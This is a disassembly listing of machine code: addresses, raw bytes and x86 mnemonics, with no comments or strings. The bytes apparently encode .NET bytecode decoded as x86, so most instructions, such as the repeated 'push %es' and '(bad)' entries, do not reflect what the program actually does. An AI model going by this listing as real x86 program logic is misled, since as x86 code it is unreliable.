  403106:	00 00                	add    %al,(%eax)
  403108:	28 08                	sub    %cl,(%eax)
  40310a:	00 00                	add    %al,(%eax)
  40310c:	06                   	push   %es
  40310d:	28 0a                	sub    %cl,(%edx)
  40310f:	00 00                	add    %al,(%eax)
  403111:	06                   	push   %es
  403112:	28 0e                	sub    %cl,(%esi)
  403114:	00 00                	add    %al,(%eax)
  403116:	06                   	push   %es
  403117:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  40311d:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  403124:	06                   	push   %es
  403125:	73 41                	jae    0x403168
  403127:	00 00                	add    %al,(%eax)
  403129:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  40312c:	42                   	inc    %edx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 26                	or     (%esi),%ah
  403131:	38 06                	cmp    %al,(%esi)
  403133:	00 00                	add    %al,(%eax)
  403135:	00 16                	add    %dl,(%esi)
  403137:	28 13                	sub    %dl,(%ebx)
  403139:	00 00                	add    %al,(%eax)
  40313b:	06                   	push   %es
  40313c:	dd 0c 00             	fisttpll (%eax,%eax,1)
  40313f:	00 00                	add    %al,(%eax)
  403141:	26 16                	es push %ss
  403143:	28 13                	sub    %dl,(%ebx)
  403145:	00 00                	add    %al,(%eax)
  403147:	06                   	push   %es
  403148:	dd 00                	fldl   (%eax)
  40314a:	00 00                	add    %al,(%eax)
  40314c:	00 2a                	add    %ch,(%edx)
  40314e:	00 00                	add    %al,(%eax)
  403150:	41                   	inc    %ecx
  403151:	1c 00                	sbb    $0x0,%al
	...
  40315b:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  403161:	01 00                	add    %eax,(%eax)
  403163:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403166:	00 00                	add    %al,(%eax)
  403168:	01 00                	add    %eax,(%eax)
  40316a:	00 01                	add    %al,(%ecx)
  40316c:	1b 30                	sbb    (%eax),%esi
  40316e:	04 00                	add    $0x0,%al
  403170:	04 01                	add    $0x1,%al
  403172:	00 00                	add    %al,(%eax)
  403174:	06                   	push   %es
  403175:	00 00                	add    %al,(%eax)
  403177:	11 28                	adc    %ebp,(%eax)
  403179:	14 00                	adc    $0x0,%al
  40317b:	00 06                	add    %al,(%esi)
  40317d:	0a 16                	or     (%esi),%dl
  40317f:	0b 06                	or     (%esi),%eax
  403181:	12 01                	adc    (%ecx),%al
  403183:	28 4e 00             	sub    %cl,0x0(%esi)
  403186:	00 0a                	add    %cl,(%edx)
  403188:	28 12                	sub    %dl,(%edx)
  40318a:	00 00                	add    %al,(%eax)
  40318c:	06                   	push   %es
  40318d:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  403193:	e4 00                	in     $0x0,%al
  403195:	00 00                	add    %al,(%eax)
  403197:	02 8e 69 28 4f 00    	add    0x4f2869(%esi),%cl
  40319d:	00 0a                	add    %cl,(%edx)
  40319f:	0c 28                	or     $0x28,%al
  4031a1:	06                   	push   %es
  4031a2:	00 00                	add    %al,(%eax)
  4031a4:	06                   	push   %es
  4031a5:	15 17 6f 50 00       	adc    $0x506f17,%eax
  4031aa:	00 0a                	add    %cl,(%edx)
  4031ac:	26 28 08             	sub    %cl,%es:(%eax)
  4031af:	00 00                	add    %al,(%eax)
  4031b1:	06                   	push   %es
  4031b2:	08 16                	or     %dl,(%esi)
  4031b4:	08 8e 69 6f 51 00    	or     %cl,0x516f69(%esi)
  4031ba:	00 0a                	add    %cl,(%edx)
  4031bc:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  4031c2:	0f 00                	(bad)
  4031c4:	3e 6e                	outsb  %ds:(%esi),(%dx)
  4031c6:	00 00                	add    %al,(%eax)
  4031c8:	00 02                	add    %al,(%edx)
  4031ca:	73 52                	jae    0x40321e
  4031cc:	00 00                	add    %al,(%eax)
  4031ce:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  4031d4:	16                   	push   %ss
  4031d5:	6a 6f                	push   $0x6f
  4031d7:	53                   	push   %ebx
  4031d8:	00 00                	add    %al,(%eax)
  4031da:	0a 20                	or     (%eax),%ah
  4031dc:	50                   	push   %eax
  4031dd:	c3                   	ret
  4031de:	00 00                	add    %al,(%eax)
  4031e0:	8d 53 00             	lea    0x0(%ebx),%edx
  4031e3:	00 01                	add    %al,(%ecx)
  4031e5:	13 05 38 26 00 00    	adc    0x2638,%eax
  4031eb:	00 28                	add    %ch,(%eax)
  4031ed:	06                   	push   %es
  4031ee:	00 00                	add    %al,(%eax)
  4031f0:	06                   	push   %es
  4031f1:	15 17 6f 50 00       	adc    $0x506f17,%eax
  4031f6:	00 0a                	add    %cl,(%edx)
  4031f8:	26 28 08             	sub    %cl,%es:(%eax)
  4031fb:	00 00                	add    %al,(%eax)
  4031fd:	06                   	push   %es
  4031fe:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  403204:	51                   	push   %ecx
  403205:	00 00                	add    %al,(%eax)
  403207:	0a 28                	or     (%eax),%ch
  403209:	08 00                	or     %al,(%eax)
  40320b:	00 06                	add    %al,(%esi)
  40320d:	6f                   	outsl  %ds:(%esi),(%dx)
  40320e:	54                   	push   %esp
  40320f:	00 00                	add    %al,(%eax)
  403211:	0a 09                	or     (%ecx),%cl
  403213:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  403219:	69 6f 4a 00 00 0a 25 	imul   $0x250a0000,0x4a(%edi),%ebp
  403220:	13 04 16             	adc    (%esi,%edx,1),%eax
  403223:	30 c7                	xor    %al,%bh
  403225:	dd 33                	fnsave (%ebx)
  403227:	00 00                	add    %al,(%eax)
  403229:	00 09                	add    %cl,(%ecx)
  40322b:	39 06                	cmp    %eax,(%esi)
  40322d:	00 00                	add    %al,(%eax)
  40322f:	00 09                	add    %cl,(%ecx)
  403231:	6f                   	outsl  %ds:(%esi),(%dx)
  403232:	27                   	daa
  403233:	00 00                	add    %al,(%eax)
  403235:	0a dc                	or     %ah,%bl
  403237:	28 06                	sub    %al,(%esi)
  403239:	00 00                	add    %al,(%eax)
  40323b:	06                   	push   %es
  40323c:	15 17 6f 50 00       	adc    $0x506f17,%eax
  403241:	00 0a                	add    %cl,(%edx)
  403243:	26 28 08             	sub    %cl,%es:(%eax)
  403246:	00 00                	add    %al,(%eax)
  403248:	06                   	push   %es
  403249:	02 16                	add    (%esi),%dl
  40324b:	02 8e 69 6f 51 00    	add    0x516f69(%esi),%cl
  403251:	00 0a                	add    %cl,(%edx)
  403253:	28 08                	sub    %cl,(%eax)
  403255:	00 00                	add    %al,(%eax)
  403257:	06                   	push   %es
  403258:	6f                   	outsl  %ds:(%esi),(%dx)
  403259:	54                   	push   %esp
  40325a:	00 00                	add    %al,(%eax)
  40325c:	0a dd                	or     %ch,%bl
  40325e:	19 00                	sbb    %eax,(%eax)
  403260:	00 00                	add    %al,(%eax)
  403262:	26 16                	es push %ss
  403264:	28 13                	sub    %dl,(%ebx)
  403266:	00 00                	add    %al,(%eax)
  403268:	06                   	push   %es
  403269:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  40326f:	39 06                	cmp    %eax,(%esi)
  403271:	00 00                	add    %al,(%eax)
  403273:	00 06                	add    %al,(%esi)
  403275:	28 55 00             	sub    %dl,0x0(%ebp)
  403278:	00 0a                	add    %cl,(%edx)
  40327a:	dc 2a                	fsubrl (%edx)
  40327c:	01 28                	add    %ebp,(%eax)
  40327e:	00 00                	add    %al,(%eax)
  403280:	02 00                	add    (%eax),%al
  403282:	58                   	pop    %eax
  403283:	00 5a b2             	add    %bl,-0x4e(%edx)
  403286:	00 0d 00 00 00 00    	add    %cl,0x0
  40328c:	00 00                	add    %al,(%eax)
  40328e:	10 00                	adc    %al,(%eax)
  403290:	da ea                	(bad)
  403292:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  403295:	00 00                	add    %al,(%eax)
  403297:	01 02                	add    %eax,(%edx)
  403299:	00 08                	add    %cl,(%eax)
  40329b:	00 ee                	add    %ch,%dh
  40329d:	f6 00 0d             	testb  $0xd,(%eax)
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	00 00                	add    %al,(%eax)
  4032a4:	1b 30                	sbb    (%eax),%esi
  4032a6:	03 00                	add    (%eax),%eax
  4032a8:	50                   	push   %eax
  4032a9:	00 00                	add    %al,(%eax)
  4032ab:	00 00                	add    %al,(%eax)
  4032ad:	00 00                	add    %al,(%eax)
  4032af:	00 73 bd             	add    %dh,-0x43(%ebx)
  4032b2:	00 00                	add    %al,(%eax)
  4032b4:	06                   	push   %es
  4032b5:	25 72 5f 14 00       	and    $0x145f72,%eax
  4032ba:	70 6f                	jo     0x40332b
  4032bc:	a8 00                	test   $0x0,%al
  4032be:	00 06                	add    %al,(%esi)
  4032c0:	72 6f                	jb     0x403331
  4032c2:	14 00                	adc    $0x0,%al
  4032c4:	70 6f                	jo     0x403335
  4032c6:	b5 00                	mov    $0x0,%ch
  4032c8:	00 06                	add    %al,(%esi)
  4032ca:	25 72 79 14 00       	and    $0x147972,%eax
  4032cf:	70 6f                	jo     0x403340
  4032d1:	a8 00                	test   $0x0,%al
  4032d3:	00 06                	add    %al,(%esi)
  4032d5:	28 50 00             	sub    %dl,0x0(%eax)
  4032d8:	00 06                	add    %al,(%esi)
  4032da:	6f                   	outsl  %ds:(%esi),(%dx)
  4032db:	b5 00                	mov    $0x0,%ch
  4032dd:	00 06                	add    %al,(%esi)
  4032df:	6f                   	outsl  %ds:(%esi),(%dx)
  4032e0:	b2 00                	mov    $0x0,%dl
  4032e2:	00 06                	add    %al,(%esi)
  4032e4:	28 20                	sub    %ah,(%eax)
  4032e6:	00 00                	add    %al,(%eax)
  4032e8:	06                   	push   %es
  4032e9:	28 56 00             	sub    %dl,0x0(%esi)
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	17                   	pop    %ss
  4032ef:	28 1a                	sub    %bl,(%edx)
  4032f1:	00 00                	add    %al,(%eax)
  4032f3:	06                   	push   %es
  4032f4:	dd 06                	fldl   (%esi)
  4032f6:	00 00                	add    %al,(%eax)
  4032f8:	00 26                	add    %ah,(%esi)
  4032fa:	dd 00                	fldl   (%eax)
  4032fc:	00 00                	add    %al,(%eax)
  4032fe:	00 2a                	add    %ch,(%edx)
  403300:	01 10                	add    %edx,(%eax)
  403302:	00 00                	add    %al,(%eax)
  403304:	00 00                	add    %al,(%eax)
  403306:	00 00                	add    %al,(%eax)
  403308:	49                   	dec    %ecx
  403309:	49                   	dec    %ecx
  40330a:	00 06                	add    %al,(%esi)
  40330c:	01 00                	add    %eax,(%eax)
  40330e:	00 01                	add    %al,(%ecx)
  403310:	1b 30                	sbb    (%eax),%esi
  403312:	02 00                	add    (%eax),%al
  403314:	2c 00                	sub    $0x0,%al
  403316:	00 00                	add    %al,(%eax)
  403318:	00 00                	add    %al,(%eax)
  40331a:	00 00                	add    %al,(%eax)
  40331c:	28 19                	sub    %bl,(%ecx)
  40331e:	00 00                	add    %al,(%eax)
  403320:	06                   	push   %es
  403321:	39 16                	cmp    %edx,(%esi)
  403323:	00 00                	add    %al,(%eax)
  403325:	00 28                	add    %ch,(%eax)
  403327:	12 00                	adc    (%eax),%al
  403329:	00 06                	add    %al,(%esi)
  40332b:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  40332e:	00 00                	add    %al,(%eax)
  403330:	28 17                	sub    %dl,(%edi)
  403332:	00 00                	add    %al,(%eax)
  403334:	06                   	push   %es
  403335:	17                   	pop    %ss
  403336:	58                   	pop    %eax
  403337:	28 18                	sub    %bl,(%eax)
  403339:	00 00                	add    %al,(%eax)
  40333b:	06                   	push   %es
  40333c:	dd 06                	fldl   (%esi)
  40333e:	00 00                	add    %al,(%eax)
  403340:	00 26                	add    %ah,(%esi)
  403342:	dd 00                	fldl   (%eax)
  403344:	00 00                	add    %al,(%eax)
  403346:	00 2a                	add    %ch,(%edx)
  403348:	01 10                	add    %edx,(%eax)
  40334a:	00 00                	add    %al,(%eax)
  40334c:	00 00                	add    %al,(%eax)
  40334e:	00 00                	add    %al,(%eax)
  403350:	25 25 00 06 01       	and    $0x1060025,%eax
  403355:	00 00                	add    %al,(%eax)
  403357:	01 1b                	add    %ebx,(%ebx)
  403359:	30 04 00             	xor    %al,(%eax,%eax,1)
  40335c:	dc 01                	faddl  (%ecx)
  40335e:	00 00                	add    %al,(%eax)
  403360:	07                   	pop    %es
  403361:	00 00                	add    %al,(%eax)
  403363:	11 73 bd             	adc    %esi,-0x43(%ebx)
  403366:	00 00                	add    %al,(%eax)
  403368:	06                   	push   %es
  403369:	0a 06                	or     (%esi),%al
  40336b:	02 74 01 00          	add    0x0(%ecx,%eax,1),%dh
  40336f:	00 1b                	add    %bl,(%ebx)
  403371:	6f                   	outsl  %ds:(%esi),(%dx)
  403372:	af                   	scas   %es:(%edi),%eax
  403373:	00 00                	add    %al,(%eax)
  403375:	06                   	push   %es
  403376:	06                   	push   %es
  403377:	72 5f                	jb     0x4033d8
  403379:	14 00                	adc    $0x0,%al
  40337b:	70 6f                	jo     0x4033ec
  40337d:	a8 00                	test   $0x0,%al
  40337f:	00 06                	add    %al,(%esi)
  403381:	6f                   	outsl  %ds:(%esi),(%dx)
  403382:	b4 00                	mov    $0x0,%ah
  403384:	00 06                	add    %al,(%esi)
  403386:	0b 07                	or     (%edi),%eax
  403388:	72 89                	jb     0x403313
  40338a:	14 00                	adc    $0x0,%al
  40338c:	70 28                	jo     0x4033b6
  40338e:	2b 00                	sub    (%eax),%eax
  403390:	00 0a                	add    %cl,(%edx)
  403392:	3a 25 00 00 00 07    	cmp    0x7000000,%ah
  403398:	72 95                	jb     0x40332f
  40339a:	14 00                	adc    $0x0,%al
  40339c:	70 28                	jo     0x4033c6
  40339e:	2b 00                	sub    (%eax),%eax
  4033a0:	00 0a                	add    %cl,(%edx)
  4033a2:	3a 60 00             	cmp    0x0(%eax),%ah
  4033a5:	00 00                	add    %al,(%eax)
  4033a7:	07                   	pop    %es
  4033a8:	72 a5                	jb     0x40334f
  4033aa:	14 00                	adc    $0x0,%al
  4033ac:	70 28                	jo     0x4033d6
  4033ae:	2b 00                	sub    (%eax),%eax
  4033b0:	00 0a                	add    %cl,(%edx)
  4033b2:	3a d9                	cmp    %cl,%bl
  4033b4:	00 00                	add    %al,(%eax)
  4033b6:	00 38                	add    %bh,(%eax)
  4033b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4033b9:	01 00                	add    %eax,(%eax)
  4033bb:	00 16                	add    %dl,(%esi)
  4033bd:	28 1a                	sub    %bl,(%edx)
  4033bf:	00 00                	add    %al,(%eax)
  4033c1:	06                   	push   %es
  4033c2:	73 bd                	jae    0x403381
  4033c4:	00 00                	add    %al,(%eax)
  4033c6:	06                   	push   %es
  4033c7:	25 72 5f 14 00       	and    $0x145f72,%eax
  4033cc:	70 6f                	jo     0x40343d
  4033ce:	a8 00                	test   $0x0,%al
  4033d0:	00 06                	add    %al,(%esi)
  4033d2:	72 89                	jb     0x40335d
  4033d4:	14 00                	adc    $0x0,%al
  4033d6:	70 6f                	jo     0x403447
  4033d8:	aa                   	stos   %al,%es:(%edi)
  4033d9:	00 00                	add    %al,(%eax)
  4033db:	06                   	push   %es
  4033dc:	25 72 79 14 00       	and    $0x147972,%eax
  4033e1:	70 6f                	jo     0x403452
  4033e3:	a8 00                	test   $0x0,%al
  4033e5:	00 06                	add    %al,(%esi)
  4033e7:	28 17                	sub    %dl,(%edi)
  4033e9:	00 00                	add    %al,(%eax)
  4033eb:	06                   	push   %es
  4033ec:	6a 6f                	push   $0x6f
  4033ee:	9d                   	popf
  4033ef:	00 00                	add    %al,(%eax)
  4033f1:	06                   	push   %es
  4033f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4033f3:	b2 00                	mov    $0x0,%dl
  4033f5:	00 06                	add    %al,(%esi)
  4033f7:	28 20                	sub    %ah,(%eax)
  4033f9:	00 00                	add    %al,(%eax)
  4033fb:	06                   	push   %es
  4033fc:	16                   	push   %ss
  4033fd:	28 18                	sub    %bl,(%eax)
  4033ff:	00 00                	add    %al,(%eax)
  403401:	06                   	push   %es
  403402:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403405:	00 00                	add    %al,(%eax)
  403407:	00 06                	add    %al,(%esi)
  403409:	72 bd                	jb     0x4033c8
  40340b:	14 00                	adc    $0x0,%al
  40340d:	70 6f                	jo     0x40347e
  40340f:	a8 00                	test   $0x0,%al
  403411:	00 06                	add    %al,(%esi)
  403413:	6f                   	outsl  %ds:(%esi),(%dx)
  403414:	b4 00                	mov    $0x0,%ah
  403416:	00 06                	add    %al,(%esi)
  403418:	28 72 00             	sub    %dh,0x0(%edx)
  40341b:	00 06                	add    %al,(%esi)
  40341d:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403421:	00 7e 1f             	add    %bh,0x1f(%esi)
  403424:	00 00                	add    %al,(%eax)
  403426:	04 06                	add    $0x6,%al
  403428:	6f                   	outsl  %ds:(%esi),(%dx)
  403429:	57                   	push   %edi
  40342a:	00 00                	add    %al,(%eax)
  40342c:	0a 73 bd             	or     -0x43(%ebx),%dh
  40342f:	00 00                	add    %al,(%eax)
  403431:	06                   	push   %es
  403432:	25 72 5f 14 00       	and    $0x145f72,%eax
  403437:	70 6f                	jo     0x4034a8
  403439:	a8 00                	test   $0x0,%al
  40343b:	00 06                	add    %al,(%esi)
  40343d:	72 c5                	jb     0x403404
  40343f:	14 00                	adc    $0x0,%al
  403441:	70 6f                	jo     0x4034b2
  403443:	aa                   	stos   %al,%es:(%edi)
  403444:	00 00                	add    %al,(%eax)
  403446:	06                   	push   %es
  403447:	25 72 db 14 00       	and    $0x14db72,%eax
  40344c:	70 6f                	jo     0x4034bd
  40344e:	a8 00                	test   $0x0,%al
  403450:	00 06                	add    %al,(%esi)
  403452:	06                   	push   %es
  403453:	72 bd                	jb     0x403412
  403455:	14 00                	adc    $0x0,%al
  403457:	70 6f                	jo     0x4034c8
  403459:	a8 00                	test   $0x0,%al
  40345b:	00 06                	add    %al,(%esi)
  40345d:	6f                   	outsl  %ds:(%esi),(%dx)
  40345e:	b4 00                	mov    $0x0,%ah
  403460:	00 06                	add    %al,(%esi)
  403462:	6f                   	outsl  %ds:(%esi),(%dx)
  403463:	aa                   	stos   %al,%es:(%edi)
  403464:	00 00                	add    %al,(%eax)
  403466:	06                   	push   %es
  403467:	6f                   	outsl  %ds:(%esi),(%dx)
  403468:	b2 00                	mov    $0x0,%dl
  40346a:	00 06                	add    %al,(%esi)
  40346c:	28 20                	sub    %ah,(%eax)
  40346e:	00 00                	add    %al,(%eax)
  403470:	06                   	push   %es
  403471:	38 06                	cmp    %al,(%esi)
  403473:	00 00                	add    %al,(%eax)
  403475:	00 06                	add    %al,(%esi)
  403477:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40347a:	00 06                	add    %al,(%esi)
  40347c:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403482:	58                   	pop    %eax
  403483:	00 00                	add    %al,(%eax)
  403485:	0a 28                	or     (%eax),%ch
  403487:	26 00 00             	add    %al,%es:(%eax)
  40348a:	06                   	push   %es
  40348b:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403491:	72 e9                	jb     0x40347c
  403493:	14 00                	adc    $0x0,%al
  403495:	70 6f                	jo     0x403506
  403497:	a8 00                	test   $0x0,%al
  403499:	00 06                	add    %al,(%esi)
  40349b:	6f                   	outsl  %ds:(%esi),(%dx)
  40349c:	b4 00                	mov    $0x0,%ah
  40349e:	00 06                	add    %al,(%esi)
  4034a0:	06                   	push   %es
  4034a1:	72 bd                	jb     0x403460
  4034a3:	14 00                	adc    $0x0,%al
  4034a5:	70 6f                	jo     0x403516
  4034a7:	a8 00                	test   $0x0,%al
  4034a9:	00 06                	add    %al,(%esi)
  4034ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4034ac:	a3 00 00 06 28       	mov    %eax,0x28060000
  4034b1:	71 00                	jno    0x4034b3
  4034b3:	00 06                	add    %al,(%esi)
  4034b5:	26 7e 1f             	es jle 0x4034d7
  4034b8:	00 00                	add    %al,(%eax)
  4034ba:	04 28                	add    $0x28,%al
  4034bc:	01 00                	add    %eax,(%eax)
  4034be:	00 2b                	add    %ch,(%ebx)
  4034c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c1:	5a                   	pop    %edx
  4034c2:	00 00                	add    %al,(%eax)
  4034c4:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4034c7:	44                   	inc    %esp
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	00 12                	add    %dl,(%edx)
  4034cc:	02 28                	add    (%eax),%ch
  4034ce:	5b                   	pop    %ebx
  4034cf:	00 00                	add    %al,(%eax)
  4034d1:	0a 0d 09 72 bd 14    	or     0x14bd7209,%cl
  4034d7:	00 70 6f             	add    %dh,0x6f(%eax)
  4034da:	a8 00                	test   $0x0,%al
  4034dc:	00 06                	add    %al,(%esi)
  4034de:	6f                   	outsl  %ds:(%esi),(%dx)
  4034df:	b4 00                	mov    $0x0,%ah
  4034e1:	00 06                	add    %al,(%esi)
  4034e3:	06                   	push   %es
  4034e4:	72 e9                	jb     0x4034cf
  4034e6:	14 00                	adc    $0x0,%al
  4034e8:	70 6f                	jo     0x403559
  4034ea:	a8 00                	test   $0x0,%al
  4034ec:	00 06                	add    %al,(%esi)
  4034ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4034ef:	b4 00                	mov    $0x0,%ah
  4034f1:	00 06                	add    %al,(%esi)
  4034f3:	28 2b                	sub    %ch,(%ebx)
  4034f5:	00 00                	add    %al,(%eax)
  4034f7:	0a 39                	or     (%ecx),%bh
  4034f9:	12 00                	adc    (%eax),%al
  4034fb:	00 00                	add    %al,(%eax)
  4034fd:	09 28                	or     %ebp,(%eax)
  4034ff:	24 00                	and    $0x0,%al
  403501:	00 06                	add    %al,(%esi)
  403503:	7e 1f                	jle    0x403524
  403505:	00 00                	add    %al,(%eax)
  403507:	04 09                	add    $0x9,%al
  403509:	6f                   	outsl  %ds:(%esi),(%dx)
  40350a:	5c                   	pop    %esp
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 26                	or     (%esi),%ah
  40350f:	12 02                	adc    (%edx),%al
  403511:	28 5d 00             	sub    %bl,0x0(%ebp)
  403514:	00 0a                	add    %cl,(%edx)
  403516:	2d b3 dd 0e 00       	sub    $0xeddb3,%eax
  40351b:	00 00                	add    %al,(%eax)
  40351d:	12 02                	adc    (%edx),%al
  40351f:	fe                   	(bad)
  403520:	16                   	push   %ss
  403521:	03 00                	add    (%eax),%eax
  403523:	00 1b                	add    %bl,(%ebx)
  403525:	6f                   	outsl  %ds:(%esi),(%dx)
  403526:	27                   	daa
  403527:	00 00                	add    %al,(%eax)
  403529:	0a dc                	or     %ah,%bl
  40352b:	dd 0f                	fisttpll (%edi)
  40352d:	00 00                	add    %al,(%eax)
  40352f:	00 6f 58             	add    %ch,0x58(%edi)
  403532:	00 00                	add    %al,(%eax)
  403534:	0a 28                	or     (%eax),%ch
  403536:	26 00 00             	add    %al,%es:(%eax)
  403539:	06                   	push   %es
  40353a:	dd 00                	fldl   (%eax)
  40353c:	00 00                	add    %al,(%eax)
  40353e:	00 2a                	add    %ch,(%edx)
  403540:	41                   	inc    %ecx
  403541:	4c                   	dec    %esp
  403542:	00 00                	add    %al,(%eax)
  403544:	00 00                	add    %al,(%eax)
  403546:	00 00                	add    %al,(%eax)
  403548:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403549:	00 00                	add    %al,(%eax)
  40354b:	00 79 00             	add    %bh,0x0(%ecx)
  40354e:	00 00                	add    %al,(%eax)
  403550:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403555:	00 00                	add    %al,(%eax)
  403557:	00 41 00             	add    %al,0x0(%ecx)
  40355a:	00 01                	add    %al,(%ecx)
  40355c:	02 00                	add    (%eax),%al
  40355e:	00 00                	add    %al,(%eax)
  403560:	62 01                	bound  %eax,(%ecx)
  403562:	00 00                	add    %al,(%eax)
  403564:	57                   	push   %edi
  403565:	00 00                	add    %al,(%eax)
  403567:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403579:	00 00                	add    %al,(%eax)
  40357b:	00 cc                	add    %cl,%ah
  40357d:	01 00                	add    %eax,(%eax)
  40357f:	00 cc                	add    %cl,%ah
  403581:	01 00                	add    %eax,(%eax)
  403583:	00 0f                	add    %cl,(%edi)
  403585:	00 00                	add    %al,(%eax)
  403587:	00 41 00             	add    %al,0x0(%ecx)
  40358a:	00 01                	add    %al,(%ecx)
  40358c:	13 30                	adc    (%eax),%esi
  40358e:	0b 00                	or     (%eax),%eax
  403590:	11 01                	adc    %eax,(%ecx)
  403592:	00 00                	add    %al,(%eax)
  403594:	08 00                	or     %al,(%eax)
  403596:	00 11                	add    %dl,(%ecx)
  403598:	28 5e 00             	sub    %bl,0x0(%esi)
  40359b:	00 0a                	add    %cl,(%edx)
  40359d:	02 72 bd             	add    -0x43(%edx),%dh
  4035a0:	14 00                	adc    $0x0,%al
  4035a2:	70 6f                	jo     0x403613
  4035a4:	a8 00                	test   $0x0,%al
  4035a6:	00 06                	add    %al,(%esi)
  4035a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4035a9:	b4 00                	mov    $0x0,%ah
  4035ab:	00 06                	add    %al,(%esi)
  4035ad:	28 72 00             	sub    %dh,0x0(%edx)
  4035b0:	00 06                	add    %al,(%esi)
  4035b2:	28 cb                	sub    %cl,%bl
  4035b4:	00 00                	add    %al,(%eax)
  4035b6:	06                   	push   %es
  4035b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4035b8:	5f                   	pop    %edi
  4035b9:	00 00                	add    %al,(%eax)
  4035bb:	0a 72 f3             	or     -0xd(%edx),%dh
  4035be:	14 00                	adc    $0x0,%al
  4035c0:	70 6f                	jo     0x403631
  4035c2:	60                   	pusha
  4035c3:	00 00                	add    %al,(%eax)
  4035c5:	0a 28                	or     (%eax),%ch
  4035c7:	61                   	popa
  4035c8:	00 00                	add    %al,(%eax)
  4035ca:	0a 0a                	or     (%edx),%cl
  4035cc:	7e 20                	jle    0x4035ee
  4035ce:	00 00                	add    %al,(%eax)
  4035d0:	04 3a                	add    $0x3a,%al
  4035d2:	85 00                	test   %eax,(%eax)
  4035d4:	00 00                	add    %al,(%eax)
  4035d6:	20 00                	and    %al,(%eax)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 72 0f             	add    %dh,0xf(%edx)
  4035dd:	15 00 70 14 d0       	adc    $0xd0147000,%eax
  4035e2:	04 00                	add    $0x0,%al
  4035e4:	00 02                	add    %al,(%edx)
  4035e6:	28 62 00             	sub    %ah,0x0(%edx)
  4035e9:	00 0a                	add    %cl,(%edx)
  4035eb:	1f                   	pop    %ds
  4035ec:	09 8d 64 00 00 01    	or     %ecx,0x1000064(%ebp)
  4035f2:	25 16 16 14 28       	and    $0x28141616,%eax
  4035f7:	63 00                	arpl   %eax,(%eax)
  4035f9:	00 0a                	add    %cl,(%edx)
  4035fb:	a2 25 17 17 14       	mov    %al,0x14171725
  403600:	28 63 00             	sub    %ah,0x0(%ebx)
  403603:	00 0a                	add    %cl,(%edx)
  403605:	a2 25 18 17 14       	mov    %al,0x14171825
  40360a:	28 63 00             	sub    %ah,0x0(%ebx)
  40360d:	00 0a                	add    %cl,(%edx)
  40360f:	a2 25 19 17 14       	mov    %al,0x14171925
  403614:	28 63 00             	sub    %ah,0x0(%ebx)
  403617:	00 0a                	add    %cl,(%edx)
  403619:	a2 25 1a 17 14       	mov    %al,0x14171a25
  40361e:	28 63 00             	sub    %ah,0x0(%ebx)
  403621:	00 0a                	add    %cl,(%edx)
  403623:	a2 25 1b 17 14       	mov    %al,0x14171b25
  403628:	28 63 00             	sub    %ah,0x0(%ebx)
  40362b:	00 0a                	add    %cl,(%edx)
  40362d:	a2 25 1c 17 14       	mov    %al,0x14171c25
  403632:	28 63 00             	sub    %ah,0x0(%ebx)
  403635:	00 0a                	add    %cl,(%edx)
  403637:	a2 25 1d 17 14       	mov    %al,0x14171d25
  40363c:	28 63 00             	sub    %ah,0x0(%ebx)
  40363f:	00 0a                	add    %cl,(%edx)
  403641:	a2 25 1e 17 14       	mov    %al,0x14171e25
  403646:	28 63 00             	sub    %ah,0x0(%ebx)
  403649:	00 0a                	add    %cl,(%edx)
  40364b:	a2 28 64 00 00       	mov    %al,0x6428
  403650:	0a 28                	or     (%eax),%ch
  403652:	65 00 00             	add    %al,%gs:(%eax)
  403655:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  40365b:	7e 20                	jle    0x40367d
  40365d:	00 00                	add    %al,(%eax)
  40365f:	04 7b                	add    $0x7b,%al
  403661:	66 00 00             	data16 add %al,(%eax)
  403664:	0a 7e 20             	or     0x20(%esi),%bh
  403667:	00 00                	add    %al,(%eax)
  403669:	04 06                	add    $0x6,%al
  40366b:	28 06                	sub    %al,(%esi)
  40366d:	00 00                	add    %al,(%eax)
  40366f:	06                   	push   %es
  403670:	7e 0b                	jle    0x40367d
  403672:	00 00                	add    %al,(%eax)
  403674:	04 7e                	add    $0x7e,%al
  403676:	0f 00 00             	sldt   (%eax)
  403679:	04 02                	add    $0x2,%al
  40367b:	72 17                	jb     0x403694
  40367d:	15 00 70 6f a8       	adc    $0xa86f7000,%eax
  403682:	00 00                	add    %al,(%eax)
  403684:	06                   	push   %es
  403685:	6f                   	outsl  %ds:(%esi),(%dx)
  403686:	a3 00 00 06 7e       	mov    %eax,0x7e060000
  40368b:	85 01                	test   %eax,(%ecx)
  40368d:	00 04 7e             	add    %al,(%esi,%edi,2)
